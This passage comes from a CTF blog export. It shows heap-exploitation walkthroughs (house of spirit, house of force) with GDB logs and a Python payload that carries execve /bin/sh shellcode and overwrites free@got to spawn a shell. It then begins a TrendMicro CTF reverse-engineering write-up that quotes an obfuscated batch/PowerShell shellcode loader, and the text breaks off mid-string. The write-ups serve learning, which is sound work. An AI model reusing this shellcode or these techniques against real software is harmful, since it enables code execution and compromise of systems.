&quot;bbbbcccc&quot;)</span><br><span class="line">0028| 0xffffd538 (&quot;aaaaaaaabbbbcccc&quot;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Breakpoint 4, 0x08048553 in fvuln (str1&#x3D;0xffffd828 &#39;a&#39; &lt;repeats 32 times&gt;, &quot;bbbbcccc&quot;, age&#x3D;0x31) at hos.c:21</span><br><span class="line">21	  ptr2 &#x3D; (char *) malloc(40);</span><br><span class="line">gdb-peda$ ni</span><br></pre></td></tr></table></figure>
<p>这里，分配到了栈上的地址。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> [----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd530 --&gt; 0x0 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xf7fb9780 --&gt; 0x0 </span><br><span class="line">EDX: 0xffffd530 --&gt; 0x0 </span><br><span class="line">ESI: 0xf7fb9000 --&gt; 0x1aedb0 </span><br><span class="line">EDI: 0xffffd584 --&gt; 0xf7fb9000 --&gt; 0x1aedb0 </span><br><span class="line">EBP: 0xffffd54c --&gt; 0xffffd588 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffd51c --&gt; 0x28 (&#39;(&#39;)</span><br><span class="line">EIP: 0x8048558 (&lt;fvuln+93&gt;:	add    esp,0x4)</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x804854e &lt;fvuln+83&gt;:	add    esp,0x4</span><br><span class="line">   0x8048551 &lt;fvuln+86&gt;:	push   0x28</span><br><span class="line">   0x8048553 &lt;fvuln+88&gt;:	call   0x80483b0 &lt;malloc@plt&gt;</span><br><span class="line">&#x3D;&gt; 0x8048558 &lt;fvuln+93&gt;:	add    esp,0x4</span><br><span class="line">   0x804855b &lt;fvuln+96&gt;:	mov    DWORD PTR [ebp-0xc],eax</span><br><span class="line">   0x804855e &lt;fvuln+99&gt;:	push   DWORD PTR [ebp-0x4]</span><br><span class="line">   0x8048561 &lt;fvuln+102&gt;:	lea    eax,[ebp-0x2c]</span><br><span class="line">   0x8048564 &lt;fvuln+105&gt;:	push   eax</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd51c --&gt; 0x28 (&#39;(&#39;)</span><br><span class="line">0004| 0xffffd520 (&quot;aaaaaaaa&quot;)</span><br><span class="line">0008| 0xffffd524 (&quot;aaaa&quot;)</span><br><span class="line">0012| 0xffffd528 --&gt; 0x0 </span><br><span class="line">0016| 0xffffd52c --&gt; 0x31 (&#39;1&#39;)</span><br><span class="line">0020| 0xffffd530 --&gt; 0x0 </span><br><span class="line">0024| 0xffffd534 (&#39;a&#39; &lt;repeats 12 times&gt;, &quot;bbbbcccc&quot;)</span><br><span class="line">0028| 0xffffd538 (&quot;aaaaaaaabbbbcccc&quot;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x08048558	21	  ptr2 &#x3D; (char *) malloc(40);</span><br><span class="line">gdb-peda$ ni</span><br><span class="line"> [----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0xffffd530 --&gt; 0x0 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xf7fb9780 --&gt; 0x0 </span><br><span class="line">EDX: 0xffffd530 --&gt; 0x0 </span><br><span class="line">ESI: 0xf7fb9000 --&gt; 0x1aedb0 </span><br><span class="line">EDI: 0xffffd584 --&gt; 0xf7fb9000 --&gt; 0x1aedb0 </span><br><span class="line">EBP: 0xffffd54c --&gt; 0xffffd588 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffd520 (&quot;aaaaaaaa&quot;)</span><br><span class="line">EIP: 0x804855b (&lt;fvuln+96&gt;:	mov    DWORD PTR [ebp-0xc],eax)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048551 &lt;fvuln+86&gt;:	push   0x28</span><br><span class="line">   0x8048553 &lt;fvuln+88&gt;:	call   0x80483b0 &lt;malloc@plt&gt;</span><br><span class="line">   0x8048558 &lt;fvuln+93&gt;:	add    esp,0x4</span><br><span class="line">&#x3D;&gt; 0x804855b &lt;fvuln+96&gt;:	mov    DWORD PTR [ebp-0xc],eax</span><br><span class="line">   0x804855e &lt;fvuln+99&gt;:	push   DWORD PTR [ebp-0x4]</span><br><span class="line">   0x8048561 &lt;fvuln+102&gt;:	lea    eax,[ebp-0x2c]</span><br><span class="line">   0x8048564 &lt;fvuln+105&gt;:	push   eax</span><br><span class="line">   0x8048565 &lt;fvuln+106&gt;:	push   0x804867f</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd520 (&quot;aaaaaaaa&quot;)</span><br><span class="line">0004| 0xffffd524 (&quot;aaaa&quot;)</span><br><span class="line">0008| 0xffffd528 --&gt; 0x0 </span><br><span class="line">0012| 0xffffd52c --&gt; 0x31 (&#39;1&#39;)</span><br><span class="line">0016| 0xffffd530 --&gt; 0x0 </span><br><span class="line">0020| 0xffffd534 (&#39;a&#39; &lt;repeats 12 times&gt;, &quot;bbbbcccc&quot;)</span><br><span class="line">0024| 0xffffd538 (&quot;aaaaaaaabbbbcccc&quot;)</span><br><span class="line">0028| 0xffffd53c (&quot;aaaabbbbcccc&quot;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x0804855b	21	  ptr2 &#x3D; (char *) malloc(40);</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure>
<hr>
<h2 id="2-hop-TBU"><a href="#2-hop-TBU" class="headerlink" title="2.hop TBU"></a>2.hop TBU</h2><h2 id="3-hom-TBU"><a href="#3-hom-TBU" class="headerlink" title="3.hom TBU"></a>3.hom TBU</h2><p>4.hof<br>控制top chunk的size字段，再之后的两次malloc()之后，分配到指定的位置。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">House of force vulnerable program. </span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt; </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> *buf1, *buf2, *buf3;</span><br><span class="line">        <span class="keyword">if</span> (argc != <span class="number">4</span>) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Usage Error\n&quot;</span>);</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        [<span class="number">1</span>]buf1 = <span class="built_in">malloc</span>(<span class="number">256</span>);</span><br><span class="line">        [<span class="number">2</span>]<span class="built_in">strcpy</span>(buf1, argv[<span class="number">1</span>]); <span class="comment">/* Prereq 1 */</span></span><br><span class="line">        [<span class="number">3</span>]buf2 = <span class="built_in">malloc</span>(strtoul(argv[<span class="number">2</span>], <span class="literal">NULL</span>, <span class="number">16</span>)); <span class="comment">/* Prereq 2 */</span></span><br><span class="line">        [<span class="number">4</span>]buf3 = <span class="built_in">malloc</span>(<span class="number">256</span>); <span class="comment">/* Prereq 3 */</span></span><br><span class="line">        [<span class="number">5</span>]<span class="built_in">strcpy</span>(buf3, argv[<span class="number">3</span>]); <span class="comment">/* Prereq 3 */</span></span><br><span class="line">        [<span class="number">6</span>]<span class="built_in">free</span>(buf3);</span><br><span class="line">        <span class="built_in">free</span>(buf2);</span><br><span class="line">        <span class="built_in">free</span>(buf1);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">free@got entry  0x08049830</span></span><br><span class="line"><span class="comment">top             0x0804a108</span></span><br><span class="line"><span class="comment">size = ((0x08049830 - 0x8) - 0x0804a108) -0x8 = 0xFFFFF718</span></span><br><span class="line"><span class="comment">python -c &#x27;print &quot;A&quot;*260 + &quot;\xff\xff\xff\xff&quot; +&quot; &quot;+&quot;0xFFFFF718&quot;+&quot; &quot;+&quot;AAAA&quot;&#x27; &gt; 1</span></span><br><span class="line"><span class="comment">control eip --&gt; 0x41414141</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p>gdb log如下<br>分配到了free@got</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> [----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x8049830 --&gt; 0x8048346 (&lt;free@plt+6&gt;:	push   0x0)</span><br><span class="line">EBX: 0xffffd340 --&gt; 0x4 </span><br><span class="line">ECX: 0xf7fb9780 --&gt; 0x0 </span><br><span class="line">EDX: 0x8049830 --&gt; 0x8048346 (&lt;free@plt+6&gt;:	push   0x0)</span><br><span class="line">ESI: 0xf7fb9000 --&gt; 0x1aedb0 </span><br><span class="line">EDI: 0xf7fb9000 --&gt; 0x1aedb0 </span><br><span class="line">EBP: 0xffffd328 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffd310 --&gt; 0x4 </span><br><span class="line">EIP: 0x804853f (&lt;main+148&gt;:	mov    DWORD PTR [ebp-0xc],eax)</span><br><span class="line">EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048532 &lt;main+135&gt;:	push   0x100</span><br><span class="line">   0x8048537 &lt;main+140&gt;:	call   0x8048360 &lt;malloc@plt&gt;</span><br><span class="line">   0x804853c &lt;main+145&gt;:	add    esp,0x10</span><br><span class="line">&#x3D;&gt; 0x804853f &lt;main+148&gt;:	mov    DWORD PTR [ebp-0xc],eax</span><br><span class="line">   0x8048542 &lt;main+151&gt;:	mov    eax,DWORD PTR [ebx+0x4]</span><br><span class="line">   0x8048545 &lt;main+154&gt;:	add    eax,0xc</span><br><span class="line">   0x8048548 &lt;main+157&gt;:	mov    eax,DWORD PTR [eax]</span><br><span class="line">   0x804854a &lt;main+159&gt;:	sub    esp,0x8</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd310 --&gt; 0x4 </span><br><span class="line">0004| 0xffffd314 --&gt; 0x804a008 (&#39;A&#39; &lt;repeats 200 times&gt;...)</span><br><span class="line">0008| 0xffffd318 --&gt; 0x804a110 --&gt; 0x0 </span><br><span class="line">0012| 0xffffd31c --&gt; 0x80485c1 (&lt;__libc_csu_init+33&gt;:	lea    eax,[ebx-0xf8])</span><br><span class="line">0016| 0xffffd320 --&gt; 0xffffd340 --&gt; 0x4 </span><br><span class="line">0020| 0xffffd324 --&gt; 0x0 </span><br><span class="line">0024| 0xffffd328 --&gt; 0x0 </span><br><span class="line">0028| 0xffffd32c --&gt; 0xf7e22637 (&lt;__libc_start_main+247&gt;:	add    esp,0x10)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x0804853f	18	        buf3 &#x3D; malloc(256); &#x2F;* Prereq 3 *&#x2F;</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure>

<p>到后面strcpy()之后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"> [----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x8049830 (&quot;AAAA&quot;)</span><br><span class="line">EBX: 0xffffd340 --&gt; 0x4 </span><br><span class="line">ECX: 0xffffd722 (&quot;AAAA&quot;)</span><br><span class="line">EDX: 0x8049830 (&quot;AAAA&quot;)</span><br><span class="line">ESI: 0xf7fb9000 --&gt; 0x1aedb0 </span><br><span class="line">EDI: 0xf7fb9000 --&gt; 0x1aedb0 </span><br><span class="line">EBP: 0xffffd328 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffd2fc --&gt; 0x8048564 (&lt;main+185&gt;:	add    esp,0x10)</span><br><span class="line">EIP: 0x41414141 (&#39;AAAA&#39;)</span><br><span class="line">EFLAGS: 0x10292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid $PC address: 0x41414141</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd2fc --&gt; 0x8048564 (&lt;main+185&gt;:	add    esp,0x10)</span><br><span class="line">0004| 0xffffd300 --&gt; 0x8049830 (&quot;AAAA&quot;)</span><br><span class="line">0008| 0xffffd304 --&gt; 0xffffd722 (&quot;AAAA&quot;)</span><br><span class="line">0012| 0xffffd308 --&gt; 0x10 </span><br><span class="line">0016| 0xffffd30c --&gt; 0x80485eb (&lt;__libc_csu_init+75&gt;:	add    edi,0x1)</span><br><span class="line">0020| 0xffffd310 --&gt; 0x4 </span><br><span class="line">0024| 0xffffd314 --&gt; 0x804a008 (&#39;A&#39; &lt;repeats 200 times&gt;...)</span><br><span class="line">0028| 0xffffd318 --&gt; 0x804a110 --&gt; 0x0 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41414141 in ?? ()</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure>
<p>该变下payload</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">shellcode =  <span class="string">&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0&quot;</span></span><br><span class="line">shellcode += <span class="string">&quot;\x0b\xcd\x80&quot;</span></span><br><span class="line">payload = <span class="string">&quot;&quot;</span></span><br><span class="line">payload += <span class="string">&quot;\x90&quot;</span>*<span class="number">10</span> + shellcode + <span class="string">&quot;A&quot;</span>*(<span class="number">260</span>-<span class="number">10</span>-<span class="built_in">len</span>(shellcode))</span><br><span class="line">payload += <span class="string">&quot;\xff\xff\xff\xff&quot;</span></span><br><span class="line">payload += <span class="string">&quot; &quot;</span> + <span class="string">&quot;0xFFFFF718&quot;</span></span><br><span class="line">payload += <span class="string">&quot; &quot;</span> + <span class="string">&quot;\x08\xa0\x04\x08&quot;</span></span><br><span class="line"><span class="built_in">print</span> payload</span><br></pre></td></tr></table></figure>
<p>gdb log这边</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x8049830 --&gt; 0x804a008 --&gt; 0x90909090 </span><br><span class="line">EBX: 0xffffd340 --&gt; 0x4 </span><br><span class="line">ECX: 0xffffd721 --&gt; 0x804a008 --&gt; 0x90909090 </span><br><span class="line">EDX: 0x8049830 --&gt; 0x804a008 --&gt; 0x90909090 </span><br><span class="line">ESI: 0xf7fb9000 --&gt; 0x1aedb0 </span><br><span class="line">EDI: 0xf7fb9000 --&gt; 0x1aedb0 </span><br><span class="line">EBP: 0xffffd328 --&gt; 0x0 </span><br><span class="line">ESP: 0xffffd300 --&gt; 0x8049830 --&gt; 0x804a008 --&gt; 0x90909090 </span><br><span class="line">EIP: 0x804855f (&lt;main+180&gt;:	call   0x8048340 &lt;free@plt&gt;)</span><br><span class="line">EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048556 &lt;main+171&gt;:	add    esp,0x10</span><br><span class="line">   0x8048559 &lt;main+174&gt;:	sub    esp,0xc</span><br><span class="line">   0x804855c &lt;main+177&gt;:	push   DWORD PTR [ebp-0xc]</span><br><span class="line">&#x3D;&gt; 0x804855f &lt;main+180&gt;:	call   0x8048340 &lt;free@plt&gt;</span><br><span class="line">   0x8048564 &lt;main+185&gt;:	add    esp,0x10</span><br><span class="line">   0x8048567 &lt;main+188&gt;:	sub    esp,0xc</span><br><span class="line">   0x804856a &lt;main+191&gt;:	push   DWORD PTR [ebp-0x10]</span><br><span class="line">   0x804856d &lt;main+194&gt;:	call   0x8048340 &lt;free@plt&gt;</span><br><span class="line">Guessed arguments:</span><br><span class="line">arg[0]: 0x8049830 --&gt; 0x804a008 --&gt; 0x90909090 </span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd300 --&gt; 0x8049830 --&gt; 0x804a008 --&gt; 0x90909090 </span><br><span class="line">0004| 0xffffd304 --&gt; 0xffffd721 --&gt; 0x804a008 --&gt; 0x90909090 </span><br><span class="line">0008| 0xffffd308 --&gt; 0x10 </span><br><span class="line">0012| 0xffffd30c --&gt; 0x80485eb (&lt;__libc_csu_init+75&gt;:	add    edi,0x1)</span><br><span class="line">0016| 0xffffd310 --&gt; 0x4 </span><br><span class="line">0020| 0xffffd314 --&gt; 0x804a008 --&gt; 0x90909090 </span><br><span class="line">0024| 0xffffd318 --&gt; 0x804a110 --&gt; 0x0 </span><br><span class="line">0028| 0xffffd31c --&gt; 0x8049830 --&gt; 0x804a008 --&gt; 0x90909090 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x0804855f	21	        free(buf3);</span><br><span class="line">gdb-peda$ pdisass 0x8048340</span><br><span class="line">Dump of assembler code from 0x8048340 to 0x8048360::	Dump of assembler code from 0x8048340 to 0x8048360:</span><br><span class="line">   0x08048340 &lt;free@plt+0&gt;:	jmp    DWORD PTR ds:0x8049830</span><br><span class="line">   0x08048346 &lt;free@plt+6&gt;:	push   0x0</span><br><span class="line">   0x0804834b &lt;free@plt+11&gt;:	jmp    0x8048330</span><br><span class="line">   0x08048350 &lt;strcpy@plt+0&gt;:	jmp    DWORD PTR ds:0x8049834</span><br><span class="line">   0x08048356 &lt;strcpy@plt+6&gt;:	push   0x8</span><br><span class="line">   0x0804835b &lt;strcpy@plt+11&gt;:	jmp    0x8048330</span><br><span class="line">End of assembler dump.</span><br><span class="line">gdb-peda$ pdisass 0x804a008</span><br><span class="line">Dump of assembler code from 0x804a008 to 0x804a028::	Dump of assembler code from 0x804a008 to 0x804a028:</span><br><span class="line">   0x0804a008:	nop</span><br><span class="line">   0x0804a009:	nop</span><br><span class="line">   0x0804a00a:	nop</span><br><span class="line">   0x0804a00b:	nop</span><br><span class="line">   0x0804a00c:	nop</span><br><span class="line">   0x0804a00d:	nop</span><br><span class="line">   0x0804a00e:	nop</span><br><span class="line">   0x0804a00f:	nop</span><br><span class="line">   0x0804a010:	nop</span><br><span class="line">   0x0804a011:	nop</span><br><span class="line">   0x0804a012:	xor    eax,eax</span><br><span class="line">   0x0804a014:	push   eax</span><br><span class="line">   0x0804a015:	push   0x68732f2f</span><br><span class="line">   0x0804a01a:	push   0x6e69622f</span><br><span class="line">   0x0804a01f:	mov    ebx,esp</span><br><span class="line">   0x0804a021:	push   eax</span><br><span class="line">   0x0804a022:	mov    edx,esp</span><br><span class="line">   0x0804a024:	push   ebx</span><br><span class="line">   0x0804a025:	mov    ecx,esp</span><br><span class="line">   0x0804a027:	mov    al,0xb</span><br><span class="line">End of assembler dump.</span><br><span class="line">gdb-peda$ c</span><br><span class="line">Continuing.</span><br><span class="line">process 9711 is executing new program: &#x2F;bin&#x2F;dash</span><br><span class="line">Error in re-setting breakpoint 1: Function &quot;main&quot; not defined.</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
<hr>
<p>5.hol TBU</p>
<hr>
<p>6.hoc TBU</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>TrendMicro CTF 2017 Reverse300</title>
    <url>/2017/06/28/TrendMicro-CTF-2017-Reverse300/</url>
    <content><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>比赛的时候看了这个题目，当时解编码的时候出了点问题，没解出来，后来发现是Powershell没分析对…</p>
<a id="more"></a>

<h4 id="0x01"><a href="#0x01" class="headerlink" title="0x01:"></a>0x01:</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> j=Thank_You_For_Joining_TMCTF2017</span><br><span class="line"><span class="built_in">set</span> k=Tested on Win7SP1 <span class="number">32</span><span class="literal">-bit</span> OS</span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> l=<span class="number">2</span>eub2XQk9DHSsncxyWSLcTCLdgyLdhyLRgiLfiCLNjhPGHXzWQHR/+Fgi2wkJItFPItUKHgB6otKGItaIAHr4zRJizSLAe4x/zHA/KyEwHQHwc8NAcfr9Dt8JC%j:~<span class="number">1</span>,<span class="number">1</span>%<span class="number">14</span>YtaJAHrZosMS4taHAHriwSLAeiJRCQcYcOyCCnUieWJwmiOTg7sUuif////iUUEu37Y4nOHHCRS6I7///+</span><br><span class="line"><span class="built_in">set</span> m=moAsSAMOY%<span class="number">02</span>maCkAOwBsdf%smadfdf9z///+qamogG8AZABSDGsaSSwhmzWMOYsA+/masdgmoKYqWTAGEAaQBuAC4ARAB//IAbA==</span><br><span class="line"><span class="built_in">set</span> n=LABNAmaodSDGASJOIHGI76msdm%<span class="built_in">ls</span>:<span class="number">1</span>qwerATSAYUDBGOSSnsAMIOLM//sogs+AuAFasgqQQYYHAFAZ2%:~QBtAGIAbABdABEA+</span><br><span class="line"><span class="built_in">set</span> o=JRQhobGwgQWgzMi5kaHVzZXIw24hcJAqJ5lb/VQSJwlC7qKJNvIccJFLoX////<span class="number">2</span>hyb1ggaGRNaWNoVHJlbjHbiFwkConjaCF9WCBoZ2FpbmhzTWVBaCFJdEloaGVyZWhsbG9UaEZ7SGVoVE1DVDHJiEwkHonhMdJSU1FS/<span class="number">9</span>AxwFD/VQg=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">set</span> p=GUAZQBwACgAOQAwACkAOwBGOALAHIAeQB7AGYAdQBuAGMAdABpAG8AbgAgAGcAZABlAGwAZQBnAGEAdABlAHsAUABhAHIAYQBtACAAKABbAFAAYQByAGEAbQBlAHQAZQByACgAUABvAHMAaQBGOALAGkAbwBuADGOALAMAAsAEGOALAYQBuAGQAYQBGOALAG8AcgB5ADGOALAJABUAHIAdQBlACkAXQAgAFsAVAB5AHAAZQBbAFGOALAXQAgACQAUABhAHIAYQBtAGUAdABlAHIAcwAsAFsAUABhAHIAYQBtAGUAdABlAHIAKABQAG8AcwBpAHQAaQBvAG4APQAxACkAXQAgAFsAVAB5AHAAZQBdACAAJABSAGUAdAB1AHIAbgBUAHkAcABlADGOALAWwBWAG8AaQBkAFGOALAKQA7ACQAVAB5AHAAZQBCAHUAaQBsAGQAZQByADGOALAWwBBAHAAcABEAG8AbQBhAGkAbgBdADoAOgBDAHUAcgByAGUAbgBGOALAEQAbwBtAGEAaQBuAC4ARABlAGYAaQBuAGUARAB5AG4AYQBtAGkAYwBBAHMAcwBlAGGOALAYgBsAHkAKAAoAE4AZQB3ACGOALATwBiAGoAZQBjAHQAIABTAHkAcwBGOALAGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBBAHMAcwBlAGGOALAYgBsAHkATgBhAGGOALAZQAoACIAUgBlAGYAbABlAGMAdABlAGQARABlAGwAZQBnAGEAdABlACIAKQApACwAWwBTAHkAcwBGOALAGUAbQAuAFIAZQBmAGwAZQBjAHQAaQBvAG4ALgBFAGGOALAaQBGOALAC4AQQBzAHMAZQBtAGIAbAB5AEIAdQBpAGwAZABlAHIAQQBjAGMAZQBzAHMAXQA6ADoAUgB1AG4AKQAuAEQAZQBmAGkAbgBlAEQAeQBuAGEAbQBpAGMATQBvAGQAdQBsAGUAKAAiAEkAbgBNAGUAbQBvAHIAeQBNAG8AZAB1AGwAZQAiACwAJABmAGEAbABzAGUAKQAuAEQAZQBmAGkAbgBlAFQAeQBwAGUAKAAiAFgAWABYACIALAAiAEMAbABhAHMAcwAsAFAAdQBiAGwAaQBjACwAUwBlAGEAbABlAGQALABBAG4Acw^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%<span 